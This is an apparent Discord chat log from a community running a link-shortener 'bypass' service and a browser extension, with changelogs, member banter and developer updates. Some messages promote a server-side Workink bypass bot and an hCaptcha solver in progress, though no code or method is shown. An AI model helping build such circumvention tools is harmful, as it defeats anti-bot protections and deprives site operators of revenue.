+[2026-05-04 09:01:09] Channel <#1443323295238979734> | azurex123: Hard Work = Vote
+[2026-05-04 09:02:20] Channel <#1443323295238979734> | azurex123: Also this only a Vote, Didnt change anything bro [skullsob~1](https://cdn.discordapp.com/emojis/1384898603012718805.webp?size=48&name=skullsob%7E1&lossless=true)
+[2026-05-04 10:07:17] Channel <#1443323295238979734> | realyogalactic: guys i have state testing for the next 2 weeks now so i wont be pushing any updates for the time.
+[2026-05-04 10:07:45] Channel <#1443323295238979734> | realyogalactic: [skull1](https://cdn.discordapp.com/emojis/1234236774201692263.webp?size=48&name=skull1&lossless=true)
+[2026-05-04 14:04:36] Channel <#1443323295238979734> | soch_ii: https://tenor.com/view/boo-gif-19787475173016375
+[2026-05-04 14:45:02] Channel <#1443323295238979734> | .ignoranc3_: ?ban
+[2026-05-04 14:45:09] Channel <#1443323295238979734> | .ignoranc3_: WHAT
+[2026-05-04 14:45:12] Channel <#1443323295238979734> | .ignoranc3_: R U DUMB
+[2026-05-04 14:48:55] Channel <#1443323295238979734> | .ignoranc3_: @Difzz | LOA why did u code ur bot like that.
+[2026-05-04 15:41:26] Channel <#1443323295238979734> | soch_ii: https://giphy.com/gifs/wrath-jojo-pose-style-61lxxizrSwyVeskdVW
+[2026-05-04 16:46:47] Channel <#1443323295238979734> | azurex123: It detect reply😁
+[2026-05-04 16:46:54] Channel <#1443323295238979734> | azurex123: Detect reply, user id, tag
+[2026-05-04 16:47:12] Channel <#1443323295238979734> | azurex123: Im not dumb, that the feature
+[2026-05-04 17:12:16] Channel <#1443323295238979734> | .ignoranc3_: No not uuu
+[2026-05-04 17:12:21] Channel <#1443323295238979734> | .ignoranc3_: We love u difzz
+[2026-05-04 17:12:26] Channel <#1443323295238979734> | .ignoranc3_: Ok what
+[2026-05-04 17:36:21] Channel <#1443323351929196674> | afk.l0l: ## 🌐 VortixWorld Extension v3.0
+
+```yaml
+
+[+] Added auto pooarmor again
+
+```
+
+<:DAGOAT:1487527090126590163> <:emoji_41:1493367020249419836>  
+**Channel** **-** #🌪️・vortixworld-tools
+[2026-05-04 17:58:53] Channel <#1443323295238979734> | azurex123: Owhh
+[2026-05-05 10:34:49] Channel <#1443323295238979734> | hells_guxrd: uh
+[2026-05-05 10:35:01] Channel <#1443323295238979734> | hells_guxrd: Announcements looks more like staff chat rn
+[2026-05-05 10:35:37] Channel <#1443323351929196674> | hells_guxrd: .exec help
+[2026-05-05 10:35:49] Channel <#1443323351929196674> | hells_guxrd: .exec BotRestart
+[2026-05-05 11:11:54] Channel <#1443323295238979734> | 20x_hana: Hey guys,
+Just a quick update from me. I’m probably going to slow down dev work for a bit, so updates might take longer than usual. Got some personal stuff going on.
+
+Lately I’ve been grinding way too hard and didn’t really take care of my health, and yeah… ended up with a herniated disc. I’ve been in treatment for about a month now, but I’m doing a lot better. I’ll be discharged tomorrow and planning to fully come back around May 10.
+
+Once I’m back, I’ll continue working on updates and new bypass stuff like before. I really appreciate you guys sticking around.
+
+Also, big thanks to all the staff and developers who helped keep things running while I was away - really appreciate it ❤️
+
+For now, you can use other services if needed instead of Tirex Bypassing Service, no worries 👍
+Thanks for understanding ❤️
+@​everyone
+[2026-05-05 11:19:03] Channel <#1443323295238979734> | .ignoranc3_: We are with you ❤️
+[2026-05-05 12:30:12] Channel <#1443323295238979734> | hells_guxrd: May god be with you ❤️
+[2026-05-05 15:26:43] Channel <#1443323295238979734> | zero.payload: Np, and we fully understand the situation your are in. May god be with you and keep you safe.
+[2026-05-05 17:25:41] Channel <#1443323295238979734> | azurex123: [emoji_8](https://cdn.discordapp.com/emojis/1491419222578823331.gif?size=48&animated=true&name=emoji_8&lossless=true)
+[2026-05-05 17:26:30] Channel <#1443323295238979734> | realyogalactic: You got this bro
+[2026-05-06 01:47:01] Channel <#1443323351929196674> | afk.l0l: ## 🌪️ VortixWorld Extension v3.1 🌐
+
+
+`[+] Changed pooarmor now has 5s delay before click & new UI design & a button to hide/show on bottom right.`
+
+`[+] Changed background design of the bypass.html page it now picks a random background and made some minor improvements.`
+
+`[+] AutoRedirect delay is set to 30 you can change it tho in settings ( it’s at 30s mainly for pooarmor )`
+
+<:DAGOAT:1487527090126590163> <:emoji_41:1493367020249419836>  
+**Channel** **-** #🌪️・vortixworld-tools
+[2026-05-06 06:05:39] Channel <#1443323295238979734> | azurex123: [agony](https://cdn.discordapp.com/emojis/1365481196653510708.gif?size=48&animated=true&name=agony&lossless=true)
+[2026-05-06 08:38:22] Channel <#1443323295238979734> | darknifus339: 1 mounth vortix bypasser key at 4k members
+[2026-05-06 08:48:30] Channel <#1443323295238979734> | azurex123: We want 1 Year [angryemoji](https://cdn.discordapp.com/emojis/1384904154610270228.webp?size=48&name=angryemoji&lossless=true)
+[2026-05-06 08:55:01] Channel <#1443323295238979734> | afk.l0l: <:JoeWideEyes:1498005674980802690>
+[2026-05-06 10:05:00] Channel <#1443323295238979734> | darknifus339: He has infinite key relax
+[2026-05-06 10:07:02] Channel <#1443323295238979734> | afk.l0l: I alr added 1 year keys<:CoolBro:1498005702155829340>
+[2026-05-06 10:07:08] Channel <#1443323295238979734> | afk.l0l: Couple mins ago
+[2026-05-06 17:28:02] Channel <#1443323295238979734> | azurex123: I'll be temporarily returning to the bypass from May 7-9.
+
+To help stabilize some bypasses, I'll be releasing a bot that can bypass Workink fully server-side. (I'm currently working on an Hcaptcha solver, with 70% progress.)
+
+@Updates Ping @Annoucement Ping
+[2026-05-06 17:28:24] Channel <#1443323295238979734> | .ignoranc3_: <:emoji_25:1501323541222522880>
+[2026-05-06 18:49:34] Channel <#1443323295238979734> | azurex123: I'm almost crazy about this Project [agony](https://cdn.discordapp.com/emojis/1365481196653510708.gif?size=48&animated=true&name=agony&lossless=true)
+[2026-05-06 22:44:23] Channel <#1443323295238979734> | realyogalactic: Guys now I have to verify my bot 100 servers
+[2026-05-06 22:44:42] Channel <#1443323295238979734> | realyogalactic: https://cdn.discordapp.com/emojis/1365481196653510708.gif?size=48&animated=true&name=agony&lossless=true
+[2026-05-06 22:45:01] Channel <#1443323295238979734> | realyogalactic: And I don’t have an id bro I’m not old enough
+[2026-05-06 22:45:06] Channel <#1443323295238979734> | realyogalactic: 😭
+[2026-05-06 23:05:12] Channel <#1443323295238979734> | yuhaabal_59553: Give me suggestions, please, for what project I can do. I'm bored, bro.
+
+
+@Annoucement Ping
+[2026-05-06 23:05:22] Channel <#1443323295238979734> | yuhaabal_59553: <:621487monkeythink:1492224273216049154>
+[2026-05-06 23:05:37] Channel <#1443323295238979734> | yuhaabal_59553: no bypass
+[2026-05-06 23:12:18] Channel <#1443323295238979734> | afk.l0l: Movie n tv shows site with no ads 🤑
+[2026-05-06 23:25:29] Channel <#1443323295238979734> | fqzzdx: https://cdn.discordapp.com/attachments/1475553118761648148/1487975776006574201/SCUBAA.gif
+[2026-05-06 23:47:48] Channel <#1443323295238979734> | darknifus339: Claude free api <:CoolBro:1498005702155829340>
+[2026-05-07 01:17:52] Channel <#1443323295238979734> | darknifus339: @Annoucement Ping I’ve done some thinking and made a decision: AI Helper is closing down. I’ve noticed that members use the AI chat mostly just to abuse it or for a laugh, rather than for actual help. Plus, AI Helper isn't being used in tickets at all.
+However, the bot won’t just be turned off and forgotten. Instead, I’m going to create a new bot with a completely different theme. The #💡・ai-chat  channel will be deleted soon, and the bot’s source code will be posted on GitHub
+[2026-05-07 04:49:33] Channel <#1443323351929196674> | .ignoranc3_: ## @TiRex manager bot will be down for a few hours due to *maintenence*
+[2026-05-07 04:52:26] Channel <#1443323351929196674> | azurex123: Use @Difzz Bot For it, and make me as the best🗿
